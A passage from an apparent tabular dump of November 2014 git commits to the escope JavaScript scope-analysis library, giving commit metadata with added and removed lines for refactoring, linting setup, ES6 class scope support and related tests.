expect(scope.references[0].isWrite()).to.be.true<\n>+        expect(scope.references[0].partial).to.be.true<\n>+        expect(scope.references[0].resolved).to.be.equal scope.variables[1]<\n>+        expect(scope.references[1].identifier.name).to.be.equal 'b'<\n>+        expect(scope.references[1].isWrite()).to.be.true<\n>+        expect(scope.references[1].partial).to.be.true<\n>+        expect(scope.references[1].resolved).to.be.equal scope.variables[2]<\n>+        expect(scope.references[2].identifier.name).to.be.equal 'c'<\n>+        expect(scope.references[2].isWrite()).to.be.true<\n>+        expect(scope.references[2].partial).to.be.true<\n>+        expect(scope.references[2].resolved).to.be.equal scope.variables[3]<\n>+        expect(scope.references[3].identifier.name).to.be.equal 'array'<\n>+        expect(scope.references[3].isWrite()).to.be.false<\n>+# vim: set sw=4 ts=4 et tw=80 :<\n>",-    function Reference(ident<c> scope<c> flag<c> writeExpr<c> maybeImplicitGlobal) {<\n>-         * Whether the Reference might refer to a global variable.<\n>-         * @member {boolean} Reference#__maybeImplicitGlobal<\n>-    Reference.RW = 0x3;<\n>-        return this.flag & Reference.WRITE;<\n>-        return this.flag & Reference.READ;<\n>-        var variable;<\n>-                variables: []<\n>-    Scope.prototype.__referencing = function __referencing(node<c> assign<c> writeExpr<c> maybeImplicitGlobal) {<\n>-            ref = new Reference(node<c> this<c> assign || Reference.READ<c> writeExpr<c> maybeImplicitGlobal);<\n>-        var resultScopes<c> scopeManager<c> variableTargetScope<c> classOuterScope;<\n>-                var i<c> iz<c> decl;<\n>-                        currentScope.__referencing(node.left.declarations[0].id<c> Reference.WRITE<c> null<c> false);<\n>-                        currentScope.__referencing(node.left<c> Reference.WRITE<c> null<c> (!currentScope.isStrict && node.left.name != null) && node);<\n>-                        variableTargetScope.__define(decl.id<c> {<\n>-                            type: Variable.Variable<c><\n>-                            name: decl.id<c><\n>-                            node: decl<c><\n>-                            index: i<c><\n>-                            kind: node.kind<c><\n>-                            parent: node<\n>-                        });<\n>-                            // initializer is found<\n>-                            currentScope.__referencing(decl.id<c> Reference.WRITE<c> decl.init<c> false);<\n>,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Thu,1,16,20 Nov 2014,Cleanup variable definition code,0,0,1,56,2427,+                this.__defineArguments();<\n>+    Scope.prototype.__defineGeneric = function (name<c> set<c> variables<c> node<c> info) {<\n>+        var variable;<\n>+        variable = set.get(name);<\n>+        if (!variable) {<\n>+            variable = new Variable(name<c> this);<\n>+            set.set(name<c> variable);<\n>+            variables.push(variable);<\n>+        }<\n>+        if (info) {<\n>+            variable.defs.push(info);<\n>+        }<\n>+        if (node) {<\n>+            variable.identifiers.push(node);<\n>+        }<\n>+    };<\n>+    Scope.prototype.__defineArguments = function () {<\n>+        this.__defineGeneric('arguments'<c> this.set<c> this.variables);<\n>+        this.taints.set('arguments'<c> true);<\n>+    };<\n>+    Scope.prototype.__defineImplicit = function (node<c> info) {<\n>+            this.__defineGeneric(node.name<c> this.implicit.set<c> this.implicit.variables<c> node<c> info);<\n>+    Scope.prototype.__define = function (node<c> info) {<\n>+            this.__defineGeneric(node.name<c> this.set<c> this.variables<c> node<c> info);<\n>,-                variable = new Variable('arguments'<c> this);<\n>-                this.taints.set('arguments'<c> true);<\n>-                this.set.set('arguments'<c> variable);<\n>-                this.variables.push(variable);<\n>-    Scope.prototype.__defineImplicit = function __defineImplicit(node<c> info) {<\n>-        var name<c> variable;<\n>-            name = node.name;<\n>-            if (!this.implicit.set.has(name)) {<\n>-                variable = new Variable(name<c> this);<\n>-                variable.identifiers.push(node);<\n>-                variable.defs.push(info);<\n>-                this.implicit.set.set(name<c> variable);<\n>-                this.implicit.variables.push(variable);<\n>-            } else {<\n>-                variable = this.implicit.set.get(name);<\n>-                variable.identifiers.push(node);<\n>-                variable.defs.push(info);<\n>-            }<\n>-    Scope.prototype.__define = function __define(node<c> info) {<\n>-        var name<c> variable;<\n>-            name = node.name;<\n>-            if (!this.set.has(name)) {<\n>-                variable = new Variable(name<c> this);<\n>-                variable.identifiers.push(node);<\n>-                variable.defs.push(info);<\n>-                this.set.set(name<c> variable);<\n>-                this.variables.push(variable);<\n>-            } else {<\n>-                variable = this.set.get(name);<\n>-                variable.identifiers.push(node);<\n>-                variable.defs.push(info);<\n>-            }<\n>,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Thu,0,58,20 Nov 2014,Add option to gulp test task,0,0,2,13,401,"+minimist = require 'minimist'<\n>+    options = minimist process.argv.slice(2)<c><\n>+        string: 'test'<c><\n>+        default:<\n>+            test: 'test/*.coffee'<\n>+    return gulp.src(options.test).pipe(mocha reporter: 'spec')<\n>+    ""jshint-stylish"": ""^1.0.0""<c><\n>+    ""minimist"": ""^1.1.0""<\n>","-TEST = [<\n>-    'test/*.coffee'<\n>-]<\n>-    return gulp.src(TEST).pipe(mocha reporter: 'spec')<\n>-    ""jshint-stylish"": ""^1.0.0""<\n>",F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Mon,4,14,17 Nov 2014,Add eslint check,0,0,2,49,1389,"+gulp = require 'gulp'<\n>+mocha = require 'gulp-mocha'<\n>+jshint = require 'gulp-jshint'<\n>+eslint = require 'gulp-eslint'<\n>+require 'coffee-script/register'<\n>+SOURCE = [<\n>+    '*.js'<\n>+ESLINT_OPTION =<\n>+    rules:<\n>+        'quotes': 0<\n>+        'eqeqeq': 0<\n>+        'no-use-before-define': 0<\n>+        'no-shadow': 0<\n>+        'no-new': 0<\n>+        'no-underscore-dangle': 0<\n>+        'no-multi-spaces': false<\n>+        'no-native-reassign': 0<\n>+    env:<\n>+        'node': true<\n>+    return gulp.src(TEST).pipe(mocha reporter: 'spec')<\n>+    return gulp.src(SOURCE)<\n>+    .pipe(jshint('.jshintrc'))<\n>+    .pipe(jshint.reporter(require('jshint-stylish')))<\n>+    .pipe(jshint.reporter('fail'))<\n>+    .pipe(eslint(ESLINT_OPTION))<\n>+    .pipe(eslint.formatEach('compact'<c> process.stderr))<\n>+    .pipe(eslint.failOnError())<\n>+    ""coffee-script"": ""~1.8.0""<c><\n>+    ""gulp"": ""~3.8.10""<c><\n>+    ""gulp-eslint"": ""^0.1.8""<c><\n>+    ""gulp-mocha"": ""~1.1.1""<c><\n>+    ""jsdoc"": ""~3.3.0-alpha10""<c><\n>+    ""jshint-stylish"": ""^1.0.0""<\n>","-gulp = require('gulp')<\n>-mocha = require('gulp-mocha')<\n>-jshint = require('gulp-jshint')<\n>-require('coffee-script/register')<\n>-LINT = [<\n>-    'Gruntfile.js'<\n>-    'escope.js'<\n>-    return gulp.src(TEST)<\n>-    .pipe(mocha(<\n>-        reporter: 'spec'<\n>-    ))<\n>-    return gulp.src(LINT).pipe(jshint('.jshintrc'))<\n>-    ""coffee-script"": ""~1.8.0""<c><\n>-    ""jsdoc"": ""~3.3.0-alpha10""<c><\n>-    ""gulp-mocha"": ""~1.1.1""<c><\n>-    ""gulp"": ""~3.8.10""<\n>",F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Mon,4,5,17 Nov 2014,Add ClassDeclaration/ClassExpression scope ref #33,0,1,3,144,6899,"+    ""validthis"": true<c><\n>+    Variable.ClassName = 'ClassName';<\n>+        if (scope.type === 'class') {<\n>+            return true;<\n>+        } else if (scope.type === 'function') {<\n>+        var variable;<\n>+            (block.type === Syntax.BlockStatement) ? 'block' :<\n>+            (block.type === Syntax.ClassDeclaration || block.type === Syntax.ClassExpression) ? 'class' : 'function';<\n>+            if (node.type === Syntax.ClassDeclaration || (node.type === Syntax.ClassExpression && node.id)) {<\n>+                return true;<\n>+            }<\n>+        var resultScopes<c> scopeManager<c> variableTargetScope<c> classOuterScope;<\n>+                case Syntax.ClassDeclaration:<\n>+                    // Outer block scope.<\n>+                    currentScope.upper.__define(node.id<c> {<\n>+                        type: Variable.ClassName<c><\n>+                        name: node.id<c><\n>+                        node: node<\n>+                    });<\n>+                    // Inner ClassBody scope.<\n>+                    currentScope.__define(node.id<c> {<\n>+                        type: Variable.ClassName<c><\n>+                        name: node.id<c><\n>+                        node: node<\n>+                    });<\n>+                    currentScope.upper.__referencing(node.superClass);<\n>+                    break;<\n>+                case Syntax.ClassExpression:<\n>+                    classOuterScope = (node.id) ? currentScope.upper : currentScope;<\n>+                    if (node.id) {<\n>+                        // Inner ClassBody scope.<\n>+                        currentScope.__define(node.id<c> {<\n>+                            type: Variable.ClassName<c><\n>+                            name: node.id<c><\n>+                            node: node<\n>+                        });<\n>+                    }<\n>+                    classOuterScope.__referencing(node.superClass);<\n>+                    break;<\n>+# -*- coding: utf-8 -*-<\n>+#  Copyright (C) 2014 Yusuke Suzuki <utatane.tea@gmail.com><\n>+#<\n>+#  Redistribution and use in source and binary forms<c> with or without<\n>+#  modification<c> are permitted provided that the following conditions are met:<\n>+#<\n>+#    * Redistributions of source code must retain the above copyright<\n>+#      notice<c> this list of conditions and the following disclaimer.<\n>+#    * Redistributions in binary form must reproduce the above copyright<\n>+#      notice<c> this list of conditions and the following disclaimer in the<\n>+#      documentation and/or other materials provided with the distribution.<\n>+#<\n>+#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS""<\n>+#  AND ANY EXPRESS OR IMPLIED WARRANTIES<c> INCLUDING<c> BUT NOT LIMITED TO<c> THE<\n>+#  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE<\n>+#  ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY<\n>+#  DIRECT<c> INDIRECT<c> INCIDENTAL<c> SPECIAL<c> EXEMPLARY<c> OR CONSEQUENTIAL DAMAGES<\n>+#  (INCLUDING<c> BUT NOT LIMITED TO<c> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;<\n>+#  LOSS OF USE<c> DATA<c> OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND<\n>+#  ON ANY THEORY OF LIABILITY<c> WHETHER IN CONTRACT<c> STRICT LIABILITY<c> OR TORT<\n>+#  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF<\n>+#  THIS SOFTWARE<c> EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.<\n>+expect = require('chai').expect<\n>+harmony = require '../third_party/esprima'<\n>+escope = require '..'<\n>+describe 'ES6 class'<c> -><\n>+    it 'declaration name creates class scope'<c> -><\n>+        ast = harmony.parse """"""<\n>+        class Derived extends Base {<\n>+            constructor() {<\n>+            }<\n>+        }<\n>+        new Derived();<\n>+        """"""<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+        expect(scopeManager.scopes).to.have.length 3<\n>+        scope = scopeManager.scopes[0]<\n>+        expect(scope.type).to.be.equal 'global'<\n>+        expect(scope.block.type).to.be.equal 'Program'<\n>+        expect(scope.isStrict).to.be.false<\n>+        expect(scope.variables).to.have.length 1<\n>+        expect(scope.variables[0].name).to.be.equal 'Derived'<\n>+        expect(scope.references).to.have.length 2<\n>+        expect(scope.references[0].identifier.name).to.be.equal 'Base'<\n>+        expect(scope.references[1].identifier.name).to.be.equal 'Derived'<\n>+        scope = scopeManager.scopes[1]<\n>+        expect(scope.type).to.be.equal 'class'<\n>+        expect(scope.block.type).to.be.equal 'ClassDeclaration'<\n>+        expect(scope.isStrict).to.be.true<\n>+        expect(scope.variables).to.have.length 1<\n>+        expect(scope.variables[0].name).to.be.equal 'Derived'<\n>+        expect(scope.references).to.have.length 0<\n>+    it 'expression name creates class scope#1'<c> -><\n>+        ast = harmony.parse """"""<\n>+        (class Derived extends Base {<\n>+            constructor() {<\n>+            }<\n>+        });<\n>+        """"""<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+        expect(scopeManager.scopes).to.have.length 3<\n>+        scope = scopeManager.scopes[0]<\n>+        expect(scope.type).to.be.equal 'global'<\n>+        expect(scope.block.type).to.be.equal 'Program'<\n>+        expect(scope.isStrict).to.be.false<\n>+        expect(scope.variables).to.have.length 0<\n>+        expect(scope.references).to.have.length 1<\n>+        expect(scope.references[0].identifier.name).to.be.equal 'Base'<\n>+        scope = scopeManager.scopes[1]<\n>+        expect(scope.type).to.be.equal 'class'<\n>+        expect(scope.block.type).to.be.equal 'ClassExpression'<\n>+        expect(scope.isStrict).to.be.true<\n>+        expect(scope.variables).to.have.length 1<\n>+        expect(scope.variables[0].name).to.be.equal 'Derived'<\n>+        expect(scope.references).to.have.length 0<\n>+        scope = scopeManager.scopes[2]<\n>+        expect(scope.type).to.be.equal 'function'<\n>+        expect(scope.block.type).to.be.equal 'FunctionExpression'<\n>+    it 'expression name creates class scope#2'<c> -><\n>+        ast = harmony.parse """"""<\n>+        (class extends Base {<\n>+            constructor() {<\n>+            }<\n>+        });<\n>+        """"""<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+        expect(scopeManager.scopes).to.have.length 2<\n>+        scope = scopeManager.scopes[0]<\n>+        expect(scope.type).to.be.equal 'global'<\n>+        expect(scope.block.type).to.be.equal 'Program'<\n>+        expect(scope.isStrict).to.be.false<\n>+        expect(scope.variables).to.have.length 0<\n>+        expect(scope.references).to.have.length 1<\n>+        expect(scope.references[0].identifier.name).to.be.equal 'Base'<\n>+        scope = scopeManager.scopes[1]<\n>+        expect(scope.type).to.be.equal 'function'<\n>+        expect(scope.block.type).to.be.equal 'FunctionExpression'<\n>+# vim: set sw=4 ts=4 et tw=80 :<\n>","-    ""white"": true<c><\n>-        if (scope.type === 'function') {<\n>-        var variable<c> body;<\n>-            (block.type === Syntax.BlockStatement) ? 'block' : 'function';<\n>-        body = this.type === 'function' ? block.body : block;<\n>-        var resultScopes<c> scopeManager<c> variableTargetScope;<\n>-    ""jshint"": ""~2.5.10""<c><\n>",F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Mon,3,33,17 Nov 2014,Re-add only fixed tests,0,1,1,123,5799,"+# -*- coding: utf-8 -*-<\n>+#  Copyright (C) 2014 Yusuke Suzuki <utatane.tea@gmail.com><\n>+#<\n>+#  Redistribution and use in source and binary forms<c> with or without<\n>+#  modification<c> are permitted provided that the following conditions are met:<\n>+#<\n>+#    * Redistributions of source code must retain the above copyright<\n>+#      notice<c> this list of conditions and the following disclaimer.<\n>+#    * Redistributions in binary form must reproduce the above copyright<\n>+#      notice<c> this list of conditions and the following disclaimer in the<\n>+#      documentation and/or other materials provided with the distribution.<\n>+#<\n>+#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS""<\n>+#  AND ANY EXPRESS OR IMPLIED WARRANTIES<c> INCLUDING<c> BUT NOT LIMITED TO<c> THE<\n>+#  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE<\n>+#  ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY<\n>+#  DIRECT<c> INDIRECT<c> INCIDENTAL<c> SPECIAL<c> EXEMPLARY<c> OR CONSEQUENTIAL DAMAGES<\n>+#  (INCLUDING<c> BUT NOT LIMITED TO<c> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;<\n>+#  LOSS OF USE<c> DATA<c> OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND<\n>+#  ON ANY THEORY OF LIABILITY<c> WHETHER IN CONTRACT<c> STRICT LIABILITY<c> OR TORT<\n>+#  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF<\n>+#  THIS SOFTWARE<c> EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.<\n>+expect = require('chai').expect<\n>+esprima = require 'esprima'<\n>+harmony = require '../third_party/esprima'<\n>+escope = require '..'<\n>+describe 'arguments'<c> -><\n>+    it 'arguments are correctly materialized'<c> -><\n>+        ast = esprima.parse """"""<\n>+        (function () {<\n>+            arguments;<\n>+        }());<\n>+        """"""<\n>+        scopeManager = escope.analyze ast<\n>+        expect(scopeManager.scopes).to.have.length 2<\n>+        globalScope = scopeManager.scopes[0]<\n>+        expect(globalScope.type).to.be.equal 'global'<\n>+        expect(globalScope.variables).to.have.length 0<\n>+        expect(globalScope.references).to.have.length 0<\n>+        scope = scopeManager.scopes[1]<\n>+        expect(scope.type).to.be.equal 'function'<\n>+        expect(scope.variables).to.have.length 1<\n>+        expect(scope.variables[0].name).to.be.equal 'arguments'<\n>+        expect(scope.isArgumentsMaterialized()).to.be.true<\n>+        expect(scope.references).to.have.length 1<\n>+        expect(scope.references[0].resolved).to.be.equal scope.variables[0]<\n>+# vim: set sw=4 ts=4 et tw=80 :<\n>+    it 'let is not hoistable#1'<c> -><\n>+        ast = harmony.parse """"""<\n>+        var i = 42; (1)<\n>+        {<\n>+            i;  // (2) ReferenceError at runtime.<\n>+            let i = 20;  // (2)<\n>+            i;  // (2)<\n>+        }<\n>+        """"""<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+        expect(scopeManager.scopes).to.have.length 2<\n>+        globalScope = scopeManager.scopes[0]<\n>+        expect(globalScope.type).to.be.equal 'global'<\n>+        expect(globalScope.variables).to.have.length 1<\n>+        expect(globalScope.variables[0].name).to.be.equal 'i'<\n>+        expect(globalScope.references).to.have.length 1<\n>+        scope = scopeManager.scopes[1]<\n>+        expect(scope.type).to.be.equal 'block'<\n>+        expect(scope.variables).to.have.length 1<\n>+        expect(scope.variables[0].name).to.be.equal 'i'<\n>+        expect(scope.references).to.have.length 3<\n>+        expect(scope.references[0].resolved).to.be.equal scope.variables[0]<\n>+        expect(scope.references[1].resolved).to.be.equal scope.variables[0]<\n>+        expect(scope.references[2].resolved).to.be.equal scope.variables[0]<\n>+    it 'let is not hoistable#2'<c> -><\n>+        ast = harmony.parse """"""<\n>+        (function () {<\n>+            var i = 42; // (1)<\n>+            i;  // (1)<\n>+            {<\n>+                i;  // (3)<\n>+                {<\n>+                    i;  // (2)<\n>+                    let i = 20;  // (2)<\n>+                    i;  // (2)<\n>+                }<\n>+                let i = 30;  // (3)<\n>+                i;  // (3)<\n>+            }<\n>+            i;  // (1)<\n>+        }());<\n>+        """"""<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+        expect(scopeManager.scopes).to.have.length 4<\n>+        globalScope = scopeManager.scopes[0]<\n>+        expect(globalScope.type).to.be.equal 'global'<\n>+        expect(globalScope.variables).to.have.length 0<\n>+        expect(globalScope.references).to.have.length 0<\n>+        scope = scopeManager.scopes[1]<\n>+        expect(scope.type).to.be.equal 'function'<\n>+        expect(scope.variables).to.have.length 2<\n>+        expect(scope.variables[0].name).to.be.equal 'arguments'<\n>+        expect(scope.variables[1].name).to.be.equal 'i'<\n>+        v1 = scope.variables[1]<\n>+        expect(scope.references).to.have.length 3<\n>+        expect(scope.references[0].resolved).to.be.equal v1<\n>+        expect(scope.references[1].resolved).to.be.equal v1<\n>+        expect(scope.references[2].resolved).to.be.equal v1<\n>+        scope = scopeManager.scopes[2]<\n>+        expect(scope.type).to.be.equal 'block'<\n>+        expect(scope.variables).to.have.length 1<\n>+        expect(scope.variables[0].name).to.be.equal 'i'<\n>+        v3 = scope.variables[0]<\n>+        expect(scope.references).to.have.length 3<\n>+        expect(scope.references[0].resolved).to.be.equal v3<\n>+        expect(scope.references[1].resolved).to.be.equal v3<\n>+        expect(scope.references[2].resolved).to.be.equal v3<\n>+        scope = scopeManager.scopes[3]<\n>+        expect(scope.type).to.be.equal 'block'<\n>+        expect(scope.variables).to.have.length 1<\n>+        expect(scope.variables[0].name).to.be.equal 'i'<\n>+        v2 = scope.variables[0]<\n>+        expect(scope.references).to.have.length 3<\n>+        expect(scope.references[0].resolved).to.be.equal v2<\n>+        expect(scope.references[1].resolved).to.be.equal v2<\n>+        expect(scope.references[2].resolved).to.be.equal v2<\n>",,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Mon,3,28,17 Nov 2014,Revert Support hoistable / non-hoistable variables This reverts commit b8623c209184077568dce431e3bc882eead09a55.,1,0,2,200,9312,+            this.__define(block.id<c> {<\n>+        if (this.set.has(name)) {<\n>+            variable = this.set.get(name);<\n>+            variable.references.push(ref);<\n>+            variable.stack = variable.stack && ref.from.variableScope === this.variableScope;<\n>+            if (ref.tainted) {<\n>+                variable.tainted = true;<\n>+                this.taints.set(variable.name<c> true);<\n>+            }<\n>+            ref.resolved = variable;<\n>+            return true;<\n>+            this.upper.__left.push(ref);<\n>+    Scope.prototype.__define = function __define(node<c> info) {<\n>+            this.__left.push(ref);<\n>+        var resultScopes<c> scopeManager<c> variableTargetScope;<\n>+                    currentScope.__define(node.param<c> {<\n>+                    currentScope.upper.__define(node.id<c> {<\n>+                        currentScope.__define(node.params[i]<c> {<\n>+                        currentScope.__define(node.params[i]<c> {<\n>+                    variableTargetScope = (node.kind === 'var') ? currentScope.variableScope : currentScope;<\n>+                        variableTargetScope.__define(decl.id<c> {<\n>,"-        this.__hoistable = new Map();<\n>-        this.__nonHoistable = new Map();<\n>-            this.__define(block.id<c> false<c> {<\n>-                this.__defineHoistable(variable<c> false);<\n>-        this.__hoistable = null;<\n>-        this.__nonHoistable = null;<\n>-        if ((variable = this.__hoistable.get(name))) {<\n>-            return this.__resolveVariable(ref<c> variable);<\n>-    Scope.prototype.__resolveVariable = function (ref<c> variable) {<\n>-        variable.references.push(ref);<\n>-        // FIXME: It is broken in ES6.<\n>-        if (ref.from.variableScope === this.variableScope) {<\n>-            variable.stack = false;<\n>-        }<\n>-        if (ref.tainted) {<\n>-            variable.tainted = true;<\n>-            this.taints.set(variable.name<c> true);<\n>-        }<\n>-        ref.resolved = variable;<\n>-        return true;<\n>-    };<\n>-            this.upper.__referencingEagerly(ref);<\n>-    Scope.prototype.__defineHoistable = function (variable<c> hoistable) {<\n>-        var name;<\n>-        name = variable.name;<\n>-        if (hoistable) {<\n>-            this.__nonHoistable['delete'](name);<\n>-            this.__hoistable.set(name<c> variable);<\n>-        } else {<\n>-            if (!this.__hoistable.has(name)) {<\n>-                this.__nonHoistable.set(name<c> variable);<\n>-            }<\n>-        }<\n>-    };<\n>-    Scope.prototype.__define = function __define(node<c> hoistable<c> info) {<\n>-            this.__defineHoistable(variable<c> hoistable);<\n>-        }<\n>-    };<\n>-    // Resolve if the current scope has non hoistable variable.<\n>-    Scope.prototype.__referencingEagerly = function (ref) {<\n>-        var name<c> variable;<\n>-        name = ref.identifier.name;<\n>-        variable = this.__nonHoistable.get(name);<\n>-        if (variable) {<\n>-            this.__resolveVariable(ref<c> variable);<\n>-        } else {<\n>-            this.__left.push(ref);<\n>-            this.__referencingEagerly(ref);<\n>-        var resultScopes<c> scopeManager<c> variableTargetScope<c> hoistable;<\n>-                    currentScope.__define(node.param<c> false<c> {<\n>-                    currentScope.upper.__define(node.id<c> true<c> {<\n>-                        currentScope.__define(node.params[i]<c> false<c> {<\n>-                        currentScope.__define(node.params[i]<c> false<c> {<\n>-                    hoistable = node.kind === 'var';<\n>-                    variableTargetScope = hoistable ? currentScope.variableScope : currentScope;<\n>-                        variableTargetScope.__define(decl.id<c> hoistable<c> {<\n>-# -*- coding: utf-8 -*-<\n>-#  Copyright (C) 2014 Yusuke Suzuki <utatane.tea@gmail.com><\n>-#<\n>-#  Redistribution and use in source and binary forms<c> with or without<\n>-#  modification<c> are permitted provided that the following conditions are met:<\n>-#<\n>-#    * Redistributions of source code must retain the above copyright<\n>-#      notice<c> this list of conditions and the following disclaimer.<\n>-#    * Redistributions in binary form must reproduce the above copyright<\n>-#      notice<c> this list of conditions and the following disclaimer in the<\n>-#      documentation and/or other materials provided with the distribution.<\n>-#<\n>-#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS""<\n>-#  AND ANY EXPRESS OR IMPLIED WARRANTIES<c> INCLUDING<c> BUT NOT LIMITED TO<c> THE<\n>-#  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE<\n>-#  ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY<\n>-#  DIRECT<c> INDIRECT<c> INCIDENTAL<c> SPECIAL<c> EXEMPLARY<c> OR CONSEQUENTIAL DAMAGES<\n>-#  (INCLUDING<c> BUT NOT LIMITED TO<c> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;<\n>-#  LOSS OF USE<c> DATA<c> OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND<\n>-#  ON ANY THEORY OF LIABILITY<c> WHETHER IN CONTRACT<c> STRICT LIABILITY<c> OR TORT<\n>-#  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF<\n>-#  THIS SOFTWARE<c> EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.<\n>-expect = require('chai').expect<\n>-esprima = require 'esprima'<\n>-harmony = require '../third_party/esprima'<\n>-escope = require '..'<\n>-describe 'arguments'<c> -><\n>-    it 'arguments are correctly materialized'<c> -><\n>-        ast = esprima.parse """"""<\n>-        (function () {<\n>-            arguments;<\n>-        }());<\n>-        """"""<\n>-        scopeManager = escope.analyze ast<\n>-        expect(scopeManager.scopes).to.have.length 2<\n>-        globalScope = scopeManager.scopes[0]<\n>-        expect(globalScope.type).to.be.equal 'global'<\n>-        expect(globalScope.variables).to.have.length 0<\n>-        expect(globalScope.references).to.have.length 0<\n>-        scope = scopeManager.scopes[1]<\n>-        expect(scope.type).to.be.equal 'function'<\n>-        expect(scope.variables).to.have.length 1<\n>-        expect(scope.variables[0].name).to.be.equal 'arguments'<\n>-        expect(scope.isArgumentsMaterialized()).to.be.true<\n>-        expect(scope.references).to.have.length 1<\n>-        expect(scope.references[0].resolved).to.be.equal scope.variables[0]<\n>-# vim: set sw=4 ts=4 et tw=80 :<\n>-    it 'let is not hoistable#1'<c> -><\n>-        ast = harmony.parse """"""<\n>-        var i = 42;<\n>-        {<\n>-            i;  // points global's i<\n>-            let i = 20;<\n>-            i;  // points block scoped i<\n>-        }<\n>-        """"""<\n>-        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>-        expect(scopeManager.scopes).to.have.length 2<\n>-        globalScope = scopeManager.scopes[0]<\n>-        expect(globalScope.type).to.be.equal 'global'<\n>-        expect(globalScope.variables).to.have.length 1<\n>-        expect(globalScope.variables[0].name).to.be.equal 'i'<\n>-        expect(globalScope.references).to.have.length 1<\n>-        scope = scopeManager.scopes[1]<\n>-        expect(scope.type).to.be.equal 'block'<\n>-        expect(scope.variables).to.have.length 1<\n>-        expect(scope.variables[0].name).to.be.equal 'i'<\n>-        expect(scope.references).to.have.length 3<\n>-        expect(scope.references[0].resolved).to.be.null  # Since global scope<\n>-        expect(scope.references[1].resolved).to.be.equal scope.variables[0]<\n>-        expect(scope.references[2].resolved).to.be.equal scope.variables[0]<\n>-    it 'let is not hoistable#2'<c> -><\n>-        ast = harmony.parse """"""<\n>-        (function () {<\n>-            var i = 42; // (1)<\n>-            i;  // (1)<\n>-            {<\n>-                i;  // (1)<\n>-                {<\n>-                    i;  // (1)<\n>-                    let i = 20;  // (2)<\n>-                    i;  // (2)<\n>-                }<\n>-                let i = 30;  // (3)<\n>-                i;  // (3)<\n>-            }<\n>-            i;  // (1)<\n>-        }());<\n>-        """"""<\n>-        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>-        expect(scopeManager.scopes).to.have.length 4<\n>-        globalScope = scopeManager.scopes[0]<\n>-        expect(globalScope.type).to.be.equal 'global'<\n>-        expect(globalScope.variables).to.have.length 0<\n>-        expect(globalScope.references).to.have.length 0<\n>-        scope = scopeManager.scopes[1]<\n>-        expect(scope.type).to.be.equal 'function'<\n>-        expect(scope.variables).to.have.length 2<\n>-        expect(scope.variables[0].name).to.be.equal 'arguments'<\n>-        expect(scope.variables[1].name).to.be.equal 'i'<\n>-        v1 = scope.variables[1]<\n>-        expect(scope.references).to.have.length 3<\n>-        expect(scope.references[0].resolved).to.be.equal v1<\n>-        expect(scope.references[1].resolved).to.be.equal v1<\n>-        expect(scope.references[2].resolved).to.be.equal v1<\n>-        scope = scopeManager.scopes[2]<\n>-        expect(scope.type).to.be.equal 'block'<\n>-        expect(scope.variables).to.have.length 1<\n>-        expect(scope.variables[0].name).to.be.equal 'i'<\n>-        v3 = scope.variables[0]<\n>-        expect(scope.references).to.have.length 3<\n>-        expect(scope.references[0].resolved).to.be.equal v1<\n>-        expect(scope.references[1].resolved).to.be.equal v3<\n>-        expect(scope.references[2].resolved).to.be.equal v3<\n>-        scope = scopeManager.scopes[3]<\n>-        expect(scope.type).to.be.equal 'block'<\n>-        expect(scope.variables).to.have.length 1<\n>-        expect(scope.variables[0].name).to.be.equal 'i'<\n>-        v2 = scope.variables[0]<\n>-        expect(scope.references).to.have.length 3<\n>-        expect(scope.references[0].resolved).to.be.equal v1<\n>-        expect(scope.references[1].resolved).to.be.equal v2<\n>-        expect(scope.references[2].resolved).to.be.equal v2<\n>",F
